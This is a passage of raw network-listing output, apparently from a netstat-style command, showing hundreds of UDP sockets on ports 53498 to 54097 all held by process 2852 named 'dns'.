  UDP        [::]                                        53498         *:*                            2852              dns
  UDP        [::]                                        53499         *:*                            2852              dns
  UDP        [::]                                        53500         *:*                            2852              dns
  UDP        [::]                                        53501         *:*                            2852              dns
  UDP        [::]                                        53502         *:*                            2852              dns
  UDP        [::]                                        53503         *:*                            2852              dns
  UDP        [::]                                        53504         *:*                            2852              dns
  UDP        [::]                                        53505         *:*                            2852              dns
  UDP        [::]                                        53506         *:*                            2852              dns
  UDP        [::]                                        53507         *:*                            2852              dns
  UDP        [::]                                        53508         *:*                            2852              dns
  UDP        [::]                                        53509         *:*                            2852              dns
  UDP        [::]                                        53510         *:*                            2852              dns
  UDP        [::]                                        53511         *:*                            2852              dns
  UDP        [::]                                        53512         *:*                            2852              dns
  UDP        [::]                                        53513         *:*                            2852              dns
  UDP        [::]                                        53514         *:*                            2852              dns
  UDP        [::]                                        53515         *:*                            2852              dns
  UDP        [::]                                        53516         *:*                            2852              dns
  UDP        [::]                                        53517         *:*                            2852              dns
  UDP        [::]                                        53518         *:*                            2852              dns
  UDP        [::]                                        53519         *:*                            2852              dns
  UDP        [::]                                        53520         *:*                            2852              dns
  UDP        [::]                                        53521         *:*                            2852              dns
  UDP        [::]                                        53522         *:*                            2852              dns
  UDP        [::]                                        53523         *:*                            2852              dns
  UDP        [::]                                        53524         *:*                            2852              dns
  UDP        [::]                                        53525         *:*                            2852              dns
  UDP        [::]                                        53526         *:*                            2852              dns
  UDP        [::]                                        53527         *:*                            2852              dns
  UDP        [::]                                        53528         *:*                            2852              dns
  UDP        [::]                                        53529         *:*                            2852              dns
  UDP        [::]                                        53530         *:*                            2852              dns
  UDP        [::]                                        53531         *:*                            2852              dns
  UDP        [::]                                        53532         *:*                            2852              dns
  UDP        [::]                                        53533         *:*                            2852              dns
  UDP        [::]                                        53534         *:*                            2852              dns
  UDP        [::]                                        53535         *:*                            2852              dns
  UDP        [::]                                        53536         *:*                            2852              dns
  UDP        [::]                                        53537         *:*                            2852              dns
  UDP        [::]                                        53538         *:*                            2852              dns
  UDP        [::]                                        53539         *:*                            2852              dns
  UDP        [::]                                        53540         *:*                            2852              dns
  UDP        [::]                                        53541         *:*                            2852              dns
  UDP        [::]                                        53542         *:*                            2852              dns
  UDP        [::]                                        53543         *:*                            2852              dns
  UDP        [::]                                        53544         *:*                            2852              dns
  UDP        [::]                                        53545         *:*                            2852              dns
  UDP        [::]                                        53546         *:*                            2852              dns
  UDP        [::]                                        53547         *:*                            2852              dns
  UDP        [::]                                        53548         *:*                            2852              dns
  UDP        [::]                                        53549         *:*                            2852              dns
  UDP        [::]                                        53550         *:*                            2852              dns
  UDP        [::]                                        53551         *:*                            2852              dns
  UDP        [::]                                        53552         *:*                            2852              dns
  UDP        [::]                                        53553         *:*                            2852              dns
  UDP        [::]                                        53554         *:*                            2852              dns
  UDP        [::]                                        53555         *:*                            2852              dns
  UDP        [::]                                        53556         *:*                            2852              dns
  UDP        [::]                                        53557         *:*                            2852              dns
  UDP        [::]                                        53558         *:*                            2852              dns
  UDP        [::]                                        53559         *:*                            2852              dns
  UDP        [::]                                        53560         *:*                            2852              dns
  UDP        [::]                                        53561         *:*                            2852              dns
  UDP        [::]                                        53562         *:*                            2852              dns
  UDP        [::]                                        53563         *:*                            2852              dns
  UDP        [::]                                        53564         *:*                            2852              dns
  UDP        [::]                                        53565         *:*                            2852              dns
  UDP        [::]                                        53566         *:*                            2852              dns
  UDP        [::]                                        53567         *:*                            2852              dns
  UDP        [::]                                        53568         *:*                            2852              dns
  UDP        [::]                                        53569         *:*                            2852              dns
  UDP        [::]                                        53570         *:*                            2852              dns
  UDP        [::]                                        53571         *:*                            2852              dns
  UDP        [::]                                        53572         *:*                            2852              dns
  UDP        [::]                                        53573         *:*                            2852              dns
  UDP        [::]                                        53574         *:*                            2852              dns
  UDP        [::]                                        53575         *:*                            2852              dns
  UDP        [::]                                        53576         *:*                            2852              dns
  UDP        [::]                                        53577         *:*                            2852              dns
  UDP        [::]                                        53578         *:*                            2852              dns
  UDP        [::]                                        53579         *:*                            2852              dns
  UDP        [::]                                        53580         *:*                            2852              dns
  UDP        [::]                                        53581         *:*                            2852              dns
  UDP        [::]                                        53582         *:*                            2852              dns
  UDP        [::]                                        53583         *:*                            2852              dns
  UDP        [::]                                        53584         *:*                            2852              dns
  UDP        [::]                                        53585         *:*                            2852              dns
  UDP        [::]                                        53586         *:*                            2852              dns
  UDP        [::]                                        53587         *:*                            2852              dns
  UDP        [::]                                        53588         *:*                            2852              dns
  UDP        [::]                                        53589         *:*                            2852              dns
  UDP        [::]                                        53590         *:*                            2852              dns
  UDP        [::]                                        53591         *:*                            2852              dns
  UDP        [::]                                        53592         *:*                            2852              dns
  UDP        [::]                                        53593         *:*                            2852              dns
  UDP        [::]                                        53594         *:*                            2852              dns
  UDP        [::]                                        53595         *:*                            2852              dns
  UDP        [::]                                        53596         *:*                            2852              dns
  UDP        [::]                                        53597         *:*                            2852              dns
  UDP        [::]                                        53598         *:*                            2852              dns
  UDP        [::]                                        53599         *:*                            2852              dns
  UDP        [::]                                        53600         *:*                            2852              dns
  UDP        [::]                                        53601         *:*                            2852              dns
  UDP        [::]                                        53602         *:*                            2852              dns
  UDP        [::]                                        53603         *:*                            2852              dns
  UDP        [::]                                        53604         *:*                            2852              dns
  UDP        [::]                                        53605         *:*                            2852              dns
  UDP        [::]                                        53606         *:*                            2852              dns
  UDP        [::]                                        53607         *:*                            2852              dns
  UDP        [::]                                        53608         *:*                            2852              dns
  UDP        [::]                                        53609         *:*                            2852              dns
  UDP        [::]                                        53610         *:*                            2852              dns
  UDP        [::]                                        53611         *:*                            2852              dns
  UDP        [::]                                        53612         *:*                            2852              dns
  UDP        [::]                                        53613         *:*                            2852              dns
  UDP        [::]                                        53614         *:*                            2852              dns
  UDP        [::]                                        53615         *:*                            2852              dns
  UDP        [::]                                        53616         *:*                            2852              dns
  UDP        [::]                                        53617         *:*                            2852              dns
  UDP        [::]                                        53618         *:*                            2852              dns
  UDP        [::]                                        53619         *:*                            2852              dns
  UDP        [::]                                        53620         *:*                            2852              dns
  UDP        [::]                                        53621         *:*                            2852              dns
  UDP        [::]                                        53622         *:*                            2852              dns
  UDP        [::]                                        53623         *:*                            2852              dns
  UDP        [::]                                        53624         *:*                            2852              dns
  UDP        [::]                                        53625         *:*                            2852              dns
  UDP        [::]                                        53626         *:*                            2852              dns
  UDP        [::]                                        53627         *:*                            2852              dns
  UDP        [::]                                        53628         *:*                            2852              dns
  UDP        [::]                                        53629         *:*                            2852              dns
  UDP        [::]                                        53630         *:*                            2852              dns
  UDP        [::]                                        53631         *:*                            2852              dns
  UDP        [::]                                        53632         *:*                            2852              dns
  UDP        [::]                                        53633         *:*                            2852              dns
  UDP        [::]                                        53634         *:*                            2852              dns
  UDP        [::]                                        53635         *:*                            2852              dns
  UDP        [::]                                        53636         *:*                            2852              dns
  UDP        [::]                                        53637         *:*                            2852              dns
  UDP        [::]                                        53638         *:*                            2852              dns
  UDP        [::]                                        53639         *:*                            2852              dns
  UDP        [::]                                        53640         *:*                            2852              dns
  UDP        [::]                                        53641         *:*                            2852              dns
  UDP        [::]                                        53642         *:*                            2852              dns
  UDP        [::]                                        53643         *:*                            2852              dns
  UDP        [::]                                        53644         *:*                            2852              dns
  UDP        [::]                                        53645         *:*                            2852              dns
  UDP        [::]                                        53646         *:*                            2852              dns
  UDP        [::]                                        53647         *:*                            2852              dns
  UDP        [::]                                        53648         *:*                            2852              dns
  UDP        [::]                                        53649         *:*                            2852              dns
  UDP        [::]                                        53650         *:*                            2852              dns
  UDP        [::]                                        53651         *:*                            2852              dns
  UDP        [::]                                        53652         *:*                            2852              dns
  UDP        [::]                                        53653         *:*                            2852              dns
  UDP        [::]                                        53654         *:*                            2852              dns
  UDP        [::]                                        53655         *:*                            2852              dns
  UDP        [::]                                        53656         *:*                            2852              dns
  UDP        [::]                                        53657         *:*                            2852              dns
  UDP        [::]                                        53658         *:*                            2852              dns
  UDP        [::]                                        53659         *:*                            2852              dns
  UDP        [::]                                        53660         *:*                            2852              dns
  UDP        [::]                                        53661         *:*                            2852              dns
  UDP        [::]                                        53662         *:*                            2852              dns
  UDP        [::]                                        53663         *:*                            2852              dns
  UDP        [::]                                        53664         *:*                            2852              dns
  UDP        [::]                                        53665         *:*                            2852              dns
  UDP        [::]                                        53666         *:*                            2852              dns
  UDP        [::]                                        53667         *:*                            2852              dns
  UDP        [::]                                        53668         *:*                            2852              dns
  UDP        [::]                                        53669         *:*                            2852              dns
  UDP        [::]                                        53670         *:*                            2852              dns
  UDP        [::]                                        53671         *:*                            2852              dns
  UDP        [::]                                        53672         *:*                            2852              dns
  UDP        [::]                                        53673         *:*                            2852              dns
  UDP        [::]                                        53674         *:*                            2852              dns
  UDP        [::]                                        53675         *:*                            2852              dns
  UDP        [::]                                        53676         *:*                            2852              dns
  UDP        [::]                                        53677         *:*                            2852              dns
  UDP        [::]                                        53678         *:*                            2852              dns
  UDP        [::]                                        53679         *:*                            2852              dns
  UDP        [::]                                        53680         *:*                            2852              dns
  UDP        [::]                                        53681         *:*                            2852              dns
  UDP        [::]                                        53682         *:*                            2852              dns
  UDP        [::]                                        53683         *:*                            2852              dns
  UDP        [::]                                        53684         *:*                            2852              dns
  UDP        [::]                                        53685         *:*                            2852              dns
  UDP        [::]                                        53686         *:*                            2852              dns
  UDP        [::]                                        53687         *:*                            2852              dns
  UDP        [::]                                        53688         *:*                            2852              dns
  UDP        [::]                                        53689         *:*                            2852              dns
  UDP        [::]                                        53690         *:*                            2852              dns
  UDP        [::]                                        53691         *:*                            2852              dns
  UDP        [::]                                        53692         *:*                            2852              dns
  UDP        [::]                                        53693         *:*                            2852              dns
  UDP        [::]                                        53694         *:*                            2852              dns
  UDP        [::]                                        53695         *:*                            2852              dns
  UDP        [::]                                        53696         *:*                            2852              dns
  UDP        [::]                                        53697         *:*                            2852              dns
  UDP        [::]                                        53698         *:*                            2852              dns
  UDP        [::]                                        53699         *:*                            2852              dns
  UDP        [::]                                        53700         *:*                            2852              dns
  UDP        [::]                                        53701         *:*                            2852              dns
  UDP        [::]                                        53702         *:*                            2852              dns
  UDP        [::]                                        53703         *:*                            2852              dns
  UDP        [::]                                        53704         *:*                            2852              dns
  UDP        [::]                                        53705         *:*                            2852              dns
  UDP        [::]                                        53706         *:*                            2852              dns
  UDP        [::]                                        53707         *:*                            2852              dns
  UDP        [::]                                        53708         *:*                            2852              dns
  UDP        [::]                                        53709         *:*                            2852              dns
  UDP        [::]                                        53710         *:*                            2852              dns
  UDP        [::]                                        53711         *:*                            2852              dns
  UDP        [::]                                        53712         *:*                            2852              dns
  UDP        [::]                                        53713         *:*                            2852              dns
  UDP        [::]                                        53714         *:*                            2852              dns
  UDP        [::]                                        53715         *:*                            2852              dns
  UDP        [::]                                        53716         *:*                            2852              dns
  UDP        [::]                                        53717         *:*                            2852              dns
  UDP        [::]                                        53718         *:*                            2852              dns
  UDP        [::]                                        53719         *:*                            2852              dns
  UDP        [::]                                        53720         *:*                            2852              dns
  UDP        [::]                                        53721         *:*                            2852              dns
  UDP        [::]                                        53722         *:*                            2852              dns
  UDP        [::]                                        53723         *:*                            2852              dns
  UDP        [::]                                        53724         *:*                            2852              dns
  UDP        [::]                                        53725         *:*                            2852              dns
  UDP        [::]                                        53726         *:*                            2852              dns
  UDP        [::]                                        53727         *:*                            2852              dns
  UDP        [::]                                        53728         *:*                            2852              dns
  UDP        [::]                                        53729         *:*                            2852              dns
  UDP        [::]                                        53730         *:*                            2852              dns
  UDP        [::]                                        53731         *:*                            2852              dns
  UDP        [::]                                        53732         *:*                            2852              dns
  UDP        [::]                                        53733         *:*                            2852              dns
  UDP        [::]                                        53734         *:*                            2852              dns
  UDP        [::]                                        53735         *:*                            2852              dns
  UDP        [::]                                        53736         *:*                            2852              dns
  UDP        [::]                                        53737         *:*                            2852              dns
  UDP        [::]                                        53738         *:*                            2852              dns
  UDP        [::]                                        53739         *:*                            2852              dns
  UDP        [::]                                        53740         *:*                            2852              dns
  UDP        [::]                                        53741         *:*                            2852              dns
  UDP        [::]                                        53742         *:*                            2852              dns
  UDP        [::]                                        53743         *:*                            2852              dns
  UDP        [::]                                        53744         *:*                            2852              dns
  UDP        [::]                                        53745         *:*                            2852              dns
  UDP        [::]                                        53746         *:*                            2852              dns
  UDP        [::]                                        53747         *:*                            2852              dns
  UDP        [::]                                        53748         *:*                            2852              dns
  UDP        [::]                                        53749         *:*                            2852              dns
  UDP        [::]                                        53750         *:*                            2852              dns
  UDP        [::]                                        53751         *:*                            2852              dns
  UDP        [::]                                        53752         *:*                            2852              dns
  UDP        [::]                                        53753         *:*                            2852              dns
  UDP        [::]                                        53754         *:*                            2852              dns
  UDP        [::]                                        53755         *:*                            2852              dns
  UDP        [::]                                        53756         *:*                            2852              dns
  UDP        [::]                                        53757         *:*                            2852              dns
  UDP        [::]                                        53758         *:*                            2852              dns
  UDP        [::]                                        53759         *:*                            2852              dns
  UDP        [::]                                        53760         *:*                            2852              dns
  UDP        [::]                                        53761         *:*                            2852              dns
  UDP        [::]                                        53762         *:*                            2852              dns
  UDP        [::]                                        53763         *:*                            2852              dns
  UDP        [::]                                        53764         *:*                            2852              dns
  UDP        [::]                                        53765         *:*                            2852              dns
  UDP        [::]                                        53766         *:*                            2852              dns
  UDP        [::]                                        53767         *:*                            2852              dns
  UDP        [::]                                        53768         *:*                            2852              dns
  UDP        [::]                                        53769         *:*                            2852              dns
  UDP        [::]                                        53770         *:*                            2852              dns
  UDP        [::]                                        53771         *:*                            2852              dns
  UDP        [::]                                        53772         *:*                            2852              dns
  UDP        [::]                                        53773         *:*                            2852              dns
  UDP        [::]                                        53774         *:*                            2852              dns
  UDP        [::]                                        53775         *:*                            2852              dns
  UDP        [::]                                        53776         *:*                            2852              dns
  UDP        [::]                                        53777         *:*                            2852              dns
  UDP        [::]                                        53778         *:*                            2852              dns
  UDP        [::]                                        53779         *:*                            2852              dns
  UDP        [::]                                        53780         *:*                            2852              dns
  UDP        [::]                                        53781         *:*                            2852              dns
  UDP        [::]                                        53782         *:*                            2852              dns
  UDP        [::]                                        53783         *:*                            2852              dns
  UDP        [::]                                        53784         *:*                            2852              dns
  UDP        [::]                                        53785         *:*                            2852              dns
  UDP        [::]                                        53786         *:*                            2852              dns
  UDP        [::]                                        53787         *:*                            2852              dns
  UDP        [::]                                        53788         *:*                            2852              dns
  UDP        [::]                                        53789         *:*                            2852              dns
  UDP        [::]                                        53790         *:*                            2852              dns
  UDP        [::]                                        53791         *:*                            2852              dns
  UDP        [::]                                        53792         *:*                            2852              dns
  UDP        [::]                                        53793         *:*                            2852              dns
  UDP        [::]                                        53794         *:*                            2852              dns
  UDP        [::]                                        53795         *:*                            2852              dns
  UDP        [::]                                        53796         *:*                            2852              dns
  UDP        [::]                                        53797         *:*                            2852              dns
  UDP        [::]                                        53798         *:*                            2852              dns
  UDP        [::]                                        53799         *:*                            2852              dns
  UDP        [::]                                        53800         *:*                            2852              dns
  UDP        [::]                                        53801         *:*                            2852              dns
  UDP        [::]                                        53802         *:*                            2852              dns
  UDP        [::]                                        53803         *:*                            2852              dns
  UDP        [::]                                        53804         *:*                            2852              dns
  UDP        [::]                                        53805         *:*                            2852              dns
  UDP        [::]                                        53806         *:*                            2852              dns
  UDP        [::]                                        53807         *:*                            2852              dns
  UDP        [::]                                        53808         *:*                            2852              dns
  UDP        [::]                                        53809         *:*                            2852              dns
  UDP        [::]                                        53810         *:*                            2852              dns
  UDP        [::]                                        53811         *:*                            2852              dns
  UDP        [::]                                        53812         *:*                            2852              dns
  UDP        [::]                                        53813         *:*                            2852              dns
  UDP        [::]                                        53814         *:*                            2852              dns
  UDP        [::]                                        53815         *:*                            2852              dns
  UDP        [::]                                        53816         *:*                            2852              dns
  UDP        [::]                                        53817         *:*                            2852              dns
  UDP        [::]                                        53818         *:*                            2852              dns
  UDP        [::]                                        53819         *:*                            2852              dns
  UDP        [::]                                        53820         *:*                            2852              dns
  UDP        [::]                                        53821         *:*                            2852              dns
  UDP        [::]                                        53822         *:*                            2852              dns
  UDP        [::]                                        53823         *:*                            2852              dns
  UDP        [::]                                        53824         *:*                            2852              dns
  UDP        [::]                                        53825         *:*                            2852              dns
  UDP        [::]                                        53826         *:*                            2852              dns
  UDP        [::]                                        53827         *:*                            2852              dns
  UDP        [::]                                        53828         *:*                            2852              dns
  UDP        [::]                                        53829         *:*                            2852              dns
  UDP        [::]                                        53830         *:*                            2852              dns
  UDP        [::]                                        53831         *:*                            2852              dns
  UDP        [::]                                        53832         *:*                            2852              dns
  UDP        [::]                                        53833         *:*                            2852              dns
  UDP        [::]                                        53834         *:*                            2852              dns
  UDP        [::]                                        53835         *:*                            2852              dns
  UDP        [::]                                        53836         *:*                            2852              dns
  UDP        [::]                                        53837         *:*                            2852              dns
  UDP        [::]                                        53838         *:*                            2852              dns
  UDP        [::]                                        53839         *:*                            2852              dns
  UDP        [::]                                        53840         *:*                            2852              dns
  UDP        [::]                                        53841         *:*                            2852              dns
  UDP        [::]                                        53842         *:*                            2852              dns
  UDP        [::]                                        53843         *:*                            2852              dns
  UDP        [::]                                        53844         *:*                            2852              dns
  UDP        [::]                                        53845         *:*                            2852              dns
  UDP        [::]                                        53846         *:*                            2852              dns
  UDP        [::]                                        53847         *:*                            2852              dns
  UDP        [::]                                        53848         *:*                            2852              dns
  UDP        [::]                                        53849         *:*                            2852              dns
  UDP        [::]                                        53850         *:*                            2852              dns
  UDP        [::]                                        53851         *:*                            2852              dns
  UDP        [::]                                        53852         *:*                            2852              dns
  UDP        [::]                                        53853         *:*                            2852              dns
  UDP        [::]                                        53854         *:*                            2852              dns
  UDP        [::]                                        53855         *:*                            2852              dns
  UDP        [::]                                        53856         *:*                            2852              dns
  UDP        [::]                                        53857         *:*                            2852              dns
  UDP        [::]                                        53858         *:*                            2852              dns
  UDP        [::]                                        53859         *:*                            2852              dns
  UDP        [::]                                        53860         *:*                            2852              dns
  UDP        [::]                                        53861         *:*                            2852              dns
  UDP        [::]                                        53862         *:*                            2852              dns
  UDP        [::]                                        53863         *:*                            2852              dns
  UDP        [::]                                        53864         *:*                            2852              dns
  UDP        [::]                                        53865         *:*                            2852              dns
  UDP        [::]                                        53866         *:*                            2852              dns
  UDP        [::]                                        53867         *:*                            2852              dns
  UDP        [::]                                        53868         *:*                            2852              dns
  UDP        [::]                                        53869         *:*                            2852              dns
  UDP        [::]                                        53870         *:*                            2852              dns
  UDP        [::]                                        53871         *:*                            2852              dns
  UDP        [::]                                        53872         *:*                            2852              dns
  UDP        [::]                                        53873         *:*                            2852              dns
  UDP        [::]                                        53874         *:*                            2852              dns
  UDP        [::]                                        53875         *:*                            2852              dns
  UDP        [::]                                        53876         *:*                            2852              dns
  UDP        [::]                                        53877         *:*                            2852              dns
  UDP        [::]                                        53878         *:*                            2852              dns
  UDP        [::]                                        53879         *:*                            2852              dns
  UDP        [::]                                        53880         *:*                            2852              dns
  UDP        [::]                                        53881         *:*                            2852              dns
  UDP        [::]                                        53882         *:*                            2852              dns
  UDP        [::]                                        53883         *:*                            2852              dns
  UDP        [::]                                        53884         *:*                            2852              dns
  UDP        [::]                                        53885         *:*                            2852              dns
  UDP        [::]                                        53886         *:*                            2852              dns
  UDP        [::]                                        53887         *:*                            2852              dns
  UDP        [::]                                        53888         *:*                            2852              dns
  UDP        [::]                                        53889         *:*                            2852              dns
  UDP        [::]                                        53890         *:*                            2852              dns
  UDP        [::]                                        53891         *:*                            2852              dns
  UDP        [::]                                        53892         *:*                            2852              dns
  UDP        [::]                                        53893         *:*                            2852              dns
  UDP        [::]                                        53894         *:*                            2852              dns
  UDP        [::]                                        53895         *:*                            2852              dns
  UDP        [::]                                        53896         *:*                            2852              dns
  UDP        [::]                                        53897         *:*                            2852              dns
  UDP        [::]                                        53898         *:*                            2852              dns
  UDP        [::]                                        53899         *:*                            2852              dns
  UDP        [::]                                        53900         *:*                            2852              dns
  UDP        [::]                                        53901         *:*                            2852              dns
  UDP        [::]                                        53902         *:*                            2852              dns
  UDP        [::]                                        53903         *:*                            2852              dns
  UDP        [::]                                        53904         *:*                            2852              dns
  UDP        [::]                                        53905         *:*                            2852              dns
  UDP        [::]                                        53906         *:*                            2852              dns
  UDP        [::]                                        53907         *:*                            2852              dns
  UDP        [::]                                        53908         *:*                            2852              dns
  UDP        [::]                                        53909         *:*                            2852              dns
  UDP        [::]                                        53910         *:*                            2852              dns
  UDP        [::]                                        53911         *:*                            2852              dns
  UDP        [::]                                        53912         *:*                            2852              dns
  UDP        [::]                                        53913         *:*                            2852              dns
  UDP        [::]                                        53914         *:*                            2852              dns
  UDP        [::]                                        53915         *:*                            2852              dns
  UDP        [::]                                        53916         *:*                            2852              dns
  UDP        [::]                                        53917         *:*                            2852              dns
  UDP        [::]                                        53918         *:*                            2852              dns
  UDP        [::]                                        53919         *:*                            2852              dns
  UDP        [::]                                        53920         *:*                            2852              dns
  UDP        [::]                                        53921         *:*                            2852              dns
  UDP        [::]                                        53922         *:*                            2852              dns
  UDP        [::]                                        53923         *:*                            2852              dns
  UDP        [::]                                        53924         *:*                            2852              dns
  UDP        [::]                                        53925         *:*                            2852              dns
  UDP        [::]                                        53926         *:*                            2852              dns
  UDP        [::]                                        53927         *:*                            2852              dns
  UDP        [::]                                        53928         *:*                            2852              dns
  UDP        [::]                                        53929         *:*                            2852              dns
  UDP        [::]                                        53930         *:*                            2852              dns
  UDP        [::]                                        53931         *:*                            2852              dns
  UDP        [::]                                        53932         *:*                            2852              dns
  UDP        [::]                                        53933         *:*                            2852              dns
  UDP        [::]                                        53934         *:*                            2852              dns
  UDP        [::]                                        53935         *:*                            2852              dns
  UDP        [::]                                        53936         *:*                            2852              dns
  UDP        [::]                                        53937         *:*                            2852              dns
  UDP        [::]                                        53938         *:*                            2852              dns
  UDP        [::]                                        53939         *:*                            2852              dns
  UDP        [::]                                        53940         *:*                            2852              dns
  UDP        [::]                                        53941         *:*                            2852              dns
  UDP        [::]                                        53942         *:*                            2852              dns
  UDP        [::]                                        53943         *:*                            2852              dns
  UDP        [::]                                        53944         *:*                            2852              dns
  UDP        [::]                                        53945         *:*                            2852              dns
  UDP        [::]                                        53946         *:*                            2852              dns
  UDP        [::]                                        53947         *:*                            2852              dns
  UDP        [::]                                        53948         *:*                            2852              dns
  UDP        [::]                                        53949         *:*                            2852              dns
  UDP        [::]                                        53950         *:*                            2852              dns
  UDP        [::]                                        53951         *:*                            2852              dns
  UDP        [::]                                        53952         *:*                            2852              dns
  UDP        [::]                                        53953         *:*                            2852              dns
  UDP        [::]                                        53954         *:*                            2852              dns
  UDP        [::]                                        53955         *:*                            2852              dns
  UDP        [::]                                        53956         *:*                            2852              dns
  UDP        [::]                                        53957         *:*                            2852              dns
  UDP        [::]                                        53958         *:*                            2852              dns
  UDP        [::]                                        53959         *:*                            2852              dns
  UDP        [::]                                        53960         *:*                            2852              dns
  UDP        [::]                                        53961         *:*                            2852              dns
  UDP        [::]                                        53962         *:*                            2852              dns
  UDP        [::]                                        53963         *:*                            2852              dns
  UDP        [::]                                        53964         *:*                            2852              dns
  UDP        [::]                                        53965         *:*                            2852              dns
  UDP        [::]                                        53966         *:*                            2852              dns
  UDP        [::]                                        53967         *:*                            2852              dns
  UDP        [::]                                        53968         *:*                            2852              dns
  UDP        [::]                                        53969         *:*                            2852              dns
  UDP        [::]                                        53970         *:*                            2852              dns
  UDP        [::]                                        53971         *:*                            2852              dns
  UDP        [::]                                        53972         *:*                            2852              dns
  UDP        [::]                                        53973         *:*                            2852              dns
  UDP        [::]                                        53974         *:*                            2852              dns
  UDP        [::]                                        53975         *:*                            2852              dns
  UDP        [::]                                        53976         *:*                            2852              dns
  UDP        [::]                                        53977         *:*                            2852              dns
  UDP        [::]                                        53978         *:*                            2852              dns
  UDP        [::]                                        53979         *:*                            2852              dns
  UDP        [::]                                        53980         *:*                            2852              dns
  UDP        [::]                                        53981         *:*                            2852              dns
  UDP        [::]                                        53982         *:*                            2852              dns
  UDP        [::]                                        53983         *:*                            2852              dns
  UDP        [::]                                        53984         *:*                            2852              dns
  UDP        [::]                                        53985         *:*                            2852              dns
  UDP        [::]                                        53986         *:*                            2852              dns
  UDP        [::]                                        53987         *:*                            2852              dns
  UDP        [::]                                        53988         *:*                            2852              dns
  UDP        [::]                                        53989         *:*                            2852              dns
  UDP        [::]                                        53990         *:*                            2852              dns
  UDP        [::]                                        53991         *:*                            2852              dns
  UDP        [::]                                        53992         *:*                            2852              dns
  UDP        [::]                                        53993         *:*                            2852              dns
  UDP        [::]                                        53994         *:*                            2852              dns
  UDP        [::]                                        53995         *:*                            2852              dns
  UDP        [::]                                        53996         *:*                            2852              dns
  UDP        [::]                                        53997         *:*                            2852              dns
  UDP        [::]                                        53998         *:*                            2852              dns
  UDP        [::]                                        53999         *:*                            2852              dns
  UDP        [::]                                        54000         *:*                            2852              dns
  UDP        [::]                                        54001         *:*                            2852              dns
  UDP        [::]                                        54002         *:*                            2852              dns
  UDP        [::]                                        54003         *:*                            2852              dns
  UDP        [::]                                        54004         *:*                            2852              dns
  UDP        [::]                                        54005         *:*                            2852              dns
  UDP        [::]                                        54006         *:*                            2852              dns
  UDP        [::]                                        54007         *:*                            2852              dns
  UDP        [::]                                        54008         *:*                            2852              dns
  UDP        [::]                                        54009         *:*                            2852              dns
  UDP        [::]                                        54010         *:*                            2852              dns
  UDP        [::]                                        54011         *:*                            2852              dns
  UDP        [::]                                        54012         *:*                            2852              dns
  UDP        [::]                                        54013         *:*                            2852              dns
  UDP        [::]                                        54014         *:*                            2852              dns
  UDP        [::]                                        54015         *:*                            2852              dns
  UDP        [::]                                        54016         *:*                            2852              dns
  UDP        [::]                                        54017         *:*                            2852              dns
  UDP        [::]                                        54018         *:*                            2852              dns
  UDP        [::]                                        54019         *:*                            2852              dns
  UDP        [::]                                        54020         *:*                            2852              dns
  UDP        [::]                                        54021         *:*                            2852              dns
  UDP        [::]                                        54022         *:*                            2852              dns
  UDP        [::]                                        54023         *:*                            2852              dns
  UDP        [::]                                        54024         *:*                            2852              dns
  UDP        [::]                                        54025         *:*                            2852              dns
  UDP        [::]                                        54026         *:*                            2852              dns
  UDP        [::]                                        54027         *:*                            2852              dns
  UDP        [::]                                        54028         *:*                            2852              dns
  UDP        [::]                                        54029         *:*                            2852              dns
  UDP        [::]                                        54030         *:*                            2852              dns
  UDP        [::]                                        54031         *:*                            2852              dns
  UDP        [::]                                        54032         *:*                            2852              dns
  UDP        [::]                                        54033         *:*                            2852              dns
  UDP        [::]                                        54034         *:*                            2852              dns
  UDP        [::]                                        54035         *:*                            2852              dns
  UDP        [::]                                        54036         *:*                            2852              dns
  UDP        [::]                                        54037         *:*                            2852              dns
  UDP        [::]                                        54038         *:*                            2852              dns
  UDP        [::]                                        54039         *:*                            2852              dns
  UDP        [::]                                        54040         *:*                            2852              dns
  UDP        [::]                                        54041         *:*                            2852              dns
  UDP        [::]                                        54042         *:*                            2852              dns
  UDP        [::]                                        54043         *:*                            2852              dns
  UDP        [::]                                        54044         *:*                            2852              dns
  UDP        [::]                                        54045         *:*                            2852              dns
  UDP        [::]                                        54046         *:*                            2852              dns
  UDP        [::]                                        54047         *:*                            2852              dns
  UDP        [::]                                        54048         *:*                            2852              dns
  UDP        [::]                                        54049         *:*                            2852              dns
  UDP        [::]                                        54050         *:*                            2852              dns
  UDP        [::]                                        54051         *:*                            2852              dns
  UDP        [::]                                        54052         *:*                            2852              dns
  UDP        [::]                                        54053         *:*                            2852              dns
  UDP        [::]                                        54054         *:*                            2852              dns
  UDP        [::]                                        54055         *:*                            2852              dns
  UDP        [::]                                        54056         *:*                            2852              dns
  UDP        [::]                                        54057         *:*                            2852              dns
  UDP        [::]                                        54058         *:*                            2852              dns
  UDP        [::]                                        54059         *:*                            2852              dns
  UDP        [::]                                        54060         *:*                            2852              dns
  UDP        [::]                                        54061         *:*                            2852              dns
  UDP        [::]                                        54062         *:*                            2852              dns
  UDP        [::]                                        54063         *:*                            2852              dns
  UDP        [::]                                        54064         *:*                            2852              dns
  UDP        [::]                                        54065         *:*                            2852              dns
  UDP        [::]                                        54066         *:*                            2852              dns
  UDP        [::]                                        54067         *:*                            2852              dns
  UDP        [::]                                        54068         *:*                            2852              dns
  UDP        [::]                                        54069         *:*                            2852              dns
  UDP        [::]                                        54070         *:*                            2852              dns
  UDP        [::]                                        54071         *:*                            2852              dns
  UDP        [::]                                        54072         *:*                            2852              dns
  UDP        [::]                                        54073         *:*                            2852              dns
  UDP        [::]                                        54074         *:*                            2852              dns
  UDP        [::]                                        54075         *:*                            2852              dns
  UDP        [::]                                        54076         *:*                            2852              dns
  UDP        [::]                                        54077         *:*                            2852              dns
  UDP        [::]                                        54078         *:*                            2852              dns
  UDP        [::]                                        54079         *:*                            2852              dns
  UDP        [::]                                        54080         *:*                            2852              dns
  UDP        [::]                                        54081         *:*                            2852              dns
  UDP        [::]                                        54082         *:*                            2852              dns
  UDP        [::]                                        54083         *:*                            2852              dns
  UDP        [::]                                        54084         *:*                            2852              dns
  UDP        [::]                                        54085         *:*                            2852              dns
  UDP        [::]                                        54086         *:*                            2852              dns
  UDP        [::]                                        54087         *:*                            2852              dns
  UDP        [::]                                        54088         *:*                            2852              dns
  UDP        [::]                                        54089         *:*                            2852              dns
  UDP        [::]                                        54090         *:*                            2852              dns
  UDP        [::]                                        54091         *:*                            2852              dns
  UDP        [::]                                        54092         *:*                            2852              dns
  UDP        [::]                                        54093         *:*                            2852              dns
  UDP        [::]                                        54094         *:*                            2852              dns
  UDP        [::]                                        54095         *:*                            2852              dns
  UDP        [::]                                        54096         *:*                            2852              dns
  UDP        [::]                                        54097         *:*                            2852              dns
